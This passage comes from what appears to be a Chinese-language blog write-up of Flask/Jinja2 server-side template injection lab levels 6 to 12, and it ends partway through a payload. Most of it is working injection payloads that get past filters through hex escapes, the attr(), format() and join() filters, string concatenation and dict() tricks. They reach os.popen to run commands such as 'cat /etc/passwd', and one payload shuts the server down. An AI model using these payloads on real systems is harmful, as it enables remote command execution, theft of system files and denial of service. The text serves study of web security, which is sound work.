class="hljs-comment">#output：&#123;&#123;&#x27;&#x27;.\x5f\x5fclass\x5f\x5f.\x5f\x5fbase\x5f\x5f.\x5f\x5fsubclasses\x5f\x5f().\x5f\x5fgetitem\x5f\x5f(64).\x5f\x5finit\x5f\x5f.\x5f\x5fglobals\x5f\x5f.\x5f\x5fbuiltins\x5f\x5f&#125;&#125;</span><br><span class="hljs-comment">#再手动把点换为[]，包裹住记的字符串得加引号，只用把名字括起来就行了，函数的小括号在中括号外：&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[&quot;\x5f\x5fgetitem\x5f\x5f&quot;](64)[&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801174345081.png"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[&quot;\x5f\x5fgetitem\x5f\x5f&quot;](64)[&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801174537355.png"></p><p>ascii编码绕过：</p><p>python中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;num:state&#125;<br><span class="hljs-comment">#num表示格式化字符在参数列表中的索引，不填默认递增</span><br><span class="hljs-comment">#state表示格式说明符</span><br><span class="hljs-comment">#%s：字符串格式化。将变量作为字符串显示。</span><br><span class="hljs-comment">#%d：整数格式化。将变量作为十进制整数显示。</span><br><span class="hljs-comment">#%f：浮点数格式化。将变量作为浮点数显示。</span><br><span class="hljs-comment">#%x：十六进制格式化。将整数变量显示为小写十六进制数。</span><br><span class="hljs-comment">#%X：十六进制格式化。将整数变量显示为大写十六进制数。</span><br><span class="hljs-comment">#%o：八进制格式化。将整数变量显示为八进制数。</span><br><span class="hljs-comment">#%c：字符格式化。将整数变量显示为对应的 Unicode 字符。</span><br><span class="hljs-comment">#%r：原始数据格式化。使用 repr() 函数将变量转换为字符串显示。</span><br><br><span class="hljs-comment">#这里我们要利用的就是%c</span><br><br><span class="hljs-string">&quot;&#123;:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">65</span>)==<span class="hljs-string">&#x27;A&#x27;</span><br><span class="hljs-comment">#因此</span><br><br><span class="hljs-string">&quot;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">99</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>)=<span class="hljs-string">&#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801180249226.png"></p><p><code>format()</code>过滤器：(适用于中括号和点都被过滤)</p><p><img src="/2023/02/09/ssti/image-20230802003013611.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95)==&#x27;__class__&#x27;<br></code></pre></td></tr></table></figure><p><code>attr()</code>过滤器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;|attr(&quot;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95))|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(64)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fimport\x5f\x5f&quot;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;<br><br>#取元素时一定要getitem，attr()过滤器用就要一用到底，不能与[],&#x27;.&#x27;等混用，也可unicode编码(\u005f)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801222353241.png"></p><p>对于python2<code>attr()</code>内也可base64编码，但是我的题目环境是py3，所以无法实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)<br></code></pre></td></tr></table></figure><p>多种方式可以组合来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;|attr(request.form.a)|attr(request.form.b)|attr(request.form.c)()|attr(request.form.d)(64)|attr(request.form.e)|attr(request.form.f)|attr(request.form.d)(request.form.g)|attr(request.form.d)(request.form.h)(request.form.i)&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__builtins__&amp;h=eval&amp;i=__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801224316737.png"></p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>点被过滤，前面讲过了，用中括号绕过。几种方式组合一下</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[64][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](request[&#x27;form&#x27;][&#x27;cmd&#x27;])[&#x27;read&#x27;]()&#125;&#125;&amp;cmd=cat /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230801235148461.png"></p><p>或者attr()过滤器，或者request对象绕过等等就不多说了</p><p><img src="/2023/02/09/ssti/image-20230801235916098.png"></p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>字符串拼接绕过：</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__clas&#x27;&#x27;s__&#x27;][&#x27;__bas&#x27;&#x27;e__&#x27;][&#x27;__subclas&#x27;&#x27;ses__&#x27;]()[64][&#x27;__ini&#x27;&#x27;t__&#x27;][&#x27;__globa&#x27;&#x27;ls__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;pop&#x27;&#x27;en&#x27;](&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230802000940569.png"></p><p>拼接字符串也可以参考<code>join()</code>过滤器</p><p><img src="/2023/02/09/ssti/image-20230802002124378.png"></p><p><img src="/2023/02/09/ssti/image-20230802002143318.png"></p><p>中括号被ban用<code>dict()</code>函数创建字典：<code>dict(__clas=1,s__=2)|join()</code></p><p>jinja2中还支持’~’字符连接两个变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230802003435533.png"></p><p>或者字符串切片反转字符串：</p><p><img src="/2023/02/09/ssti/image-20230802001152213.png"></p><p>反转字符串还可以使用<code>reverse()</code>过滤器绕实现</p><p><img src="/2023/02/09/ssti/image-20230802002515106.png"></p><p><code>replace()</code>过滤器：</p><p><img src="/2023/02/09/ssti/image-20230802002356262.png"></p><p><img src="/2023/02/09/ssti/image-20230802002419304.png"></p><p><code>string()</code>过滤器：将渲染在浏览器的部分转为一个字符串输出；</p><p><code>select()</code>过滤器：<img src="/2023/02/09/ssti/image-20230802005306318.png"></p><p>但是不知道为什么，放到浏览器后会是这样的：</p><p><img src="/2023/02/09/ssti/image-20230802005341317.png"></p><p>但是结合上那个<code>string()</code>过滤器，有点东西</p><p>能通过下标获取字符，</p><p><img src="/2023/02/09/ssti/image-20230802005523502.png"></p><p>可以再简单点<img src="/2023/02/09/ssti/image-20230802005559881.png"></p><p>拼个<code>__class__</code>看看，字符之间用~连接</p><p><img src="/2023/02/09/ssti/image-20230802010231838.png"></p><p>假如说中括号被过滤了呢？怎么取下标，不慌，这里还有一个过滤器<code>list()</code>，能把字符串对象转化成列表对象输出：</p><p><img src="/2023/02/09/ssti/image-20230802011023942.png"></p><p>这样一来就能用<code>pop()</code>方法输出字典内容了，当然用不用<code>list()</code>过滤器都能用<code>__getitem__</code><img src="/2023/02/09/ssti/image-20230802011047462.png"></p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>数字被过滤了？</p><p>不慌，有两个过滤器：</p><p><code>length()</code>过滤器：</p><p><img src="/2023/02/09/ssti/image-20230802013135950.png"></p><p><code>count()</code>过滤器：</p><p><img src="/2023/02/09/ssti/image-20230802013210012.png"></p><p><code>index()</code>函数获取数字</p><p><img src="/2023/02/09/ssti/image-20230802193034146.png"></p><p><img src="/2023/02/09/ssti/image-20230802193133736.png"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;|count()][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.form.cmd).read()&#125;&#125;&amp;cmd=cat /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230802013559353.png"></p><p>搞定，学习别人的方法，可以直接通过循环寻找可利用类，不需要数字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><p>实际情况中可以自行选择可利用类，万一popen就被ban了呢？</p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>把config关掉了</p><p><img src="/2023/02/09/ssti/image-20230802015231902.png"></p><p>学习怎么查看配置的时候发现了一个好玩的：</p><p>在request对象中有一个叫做environ的对象，request.environ字典包含和服务器环境相关的对象，其中有一个’werkzeug.server.shutdown’&#x3D;&gt;shutdown_server()的方法，所以当我们注入<code>code=&#123;&#123;request.environ['werkzeug.server.shutdown']()&#125;&#125;</code>时</p><p><img src="/2023/02/09/ssti/image-20230802020434847.png"></p><p>叮咚，程序停了</p><p><img src="/2023/02/09/ssti/image-20230802020620149.png"></p><p>还发现某些情况下也可以不用那么麻烦地向前回溯到基类，再往下找可利用类和方法，一些内置的对象和函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;get_flashed_messages.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;url_for.__globals__.__builtins__.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>学会了不用<code>__globals__</code>的注入姿势：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">#warnings.catch_warnings类内部定义了_module=sys.modules[&#x27;warnings&#x27;]，而warnings模块含有__builtins__，如果可以找到warnings.catch_warnings类,则可以不使用__globals__<br><br>code=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[157]()._module.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230802032116868.png"></p><p>还发现了过滤了class的话可以用dict直接跳过获取对象类的步骤：</p><p><img src="/2023/02/09/ssti/image-20230802023425961.png"></p><p>最后总算找到了<a href="https://xz.aliyun.com/t/8029">一篇文章</a>，对于ssti的讲解还是比较到位的</p><p>如果过滤了config，又需要查config：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230802030842185.png"></p><p>自己试了别的，发现url_for也可以，flask内置了这两个函数，</p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p><img src="/2023/02/09/ssti/image-20230802152241886.png"></p><p>过滤了挺多东西的，点和中括号都被过滤了就得考虑<code>attr()</code>过滤器了，引号和request也被过滤了，那就拼字符，点被过滤所以chr的路暂时行不通(其实也不是不行就是很麻烦)，上面讲到过<code>select()</code>和<code>string()</code>还有<code>list()</code>过滤器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;1|select|string|list&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230802135939015.png"></p><p>考虑到attr()过滤器里面包含的是字符串，那就先拼个pop出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set pop=dict(pop=a)|join()%&#125;&#123;&#123;(1|select|string|list)|attr(pop)(0)&#125;&#125;<br></code></pre></td></tr></table></figure><p>都做到这了，有了新的想法，为啥那么麻烦一个一个字符地拼接呢，直接字符串拼起来不就好了</p><p>没过滤下划线，那就把下划线设为一个变量，到时候变量与变量用~连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;&#123;&#123;under&#125;&#125;<br></code></pre></td></tr></table></figure><p>再拼接关键词：</p><p>这里为了减少工作量，我们选择payload原型为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>需要的引号内的关键字有<code>__globals__</code>,<code>__import__</code>,<code>__builtins__</code>,os,popen,read,cmd，当然选中<code>__builtins__</code>属性的话还需要<code>__getitem__</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set cmd=dict(cmd=a)|join()%&#125;<br></code></pre></td></tr></table></figure><p>先测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set cmd=dict(ls=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(getitem)(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure><p>可以看到已经成功导入os模块了！</p><p><img src="/2023/02/09/ssti/image-20230802142259287.png"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set cmd=dict(env=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230802145108337.png"></p><p>emmm，停，有点问题，空格咋办，执行命令时难免会碰到空格的吧，当我试着用上面类似的方法构造空格时我失败了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set space=dict( =a)|join()%&#125;#这种方法不行<br></code></pre></td></tr></table></figure><p>还是得回到上面select过滤器那里，构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set pop=dict(pop=a)|join()%&#125;&#123;%set space=(1|select|string|list)|attr(pop)(10)%&#125;<br></code></pre></td></tr></table></figure><p>这样就能构造空格啦</p><p>然后就成这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set pop=dict(pop=a)|join()%&#125;<br>&#123;%set space=(1|select|string|list)|attr(pop)(10)%&#125;<br>&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set cmd=dict(la=a)|join()~space~dict(/=b)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure><p>啊啊啊啊啊啊还要再pop斜杠，好麻烦。。</p><p>浪费那么多时间不如试试request拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set cmd=dict(cmd=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)((req|attr(form)|attr(cmd)))|attr(read)()&#125;&#125;&amp;cmd=ls<br></code></pre></td></tr></table></figure><p>啥啥啥，又踩一个坑，<strong>这样传进去的是”request”字符串而根本不是request对象啊</strong>，那就去找request对象，运气不错，很快就找到了：</p><p><img src="/2023/02/09/ssti/image-20230802150900349.png"></p><p>重新构造，虽然内置request，也就是说可通过<code>&#123;&#123;request&#125;&#125;</code>访问，但是注意这里构造的”request”依旧是字符串;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set cmd=url_for|attr(globals)|attr(getitem)(req)|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure><p>至此，最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set cmd=url_for|attr(globals)|attr(getitem)(req)|attr(form)|attr(getitem)(a)%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;&amp;a=cat /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/ssti/image-20230802151957916.png"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p><img src="/2023/02/09/ssti/image-20230802152224096.png"></p><p>和11题差不了多少，就是下划线被过滤了，那url_for就用不了了，下划线用select获取，然后因为0-9被过滤了，用<code>length()</code>或者<code>count()</code>过滤器获取数字,试着从<code>&#123;&#123;request&#125;&#125;</code>溯源然后反过来利用request也没弄成功，不过问题不大，这题没有ban掉request，直接用</p><p>pyaload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;%set pop=dict(pop=a)|join()%&#125;<br>&#123;%set str=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join()%&#125;<br>&#123;%set len=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join()|length()%&#125;<br>&#123;%set under=(a|select|string|list)|attr(pop)(str|length())%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set base=under~under~dict(base=a)|join()~under~under%&#125;<br>&#123;%set init=under~under~dict(init=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set subclasses=under~under~dict(subclasses=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set a=dict(a=a)|join()%&#125;<br>&#123;%set 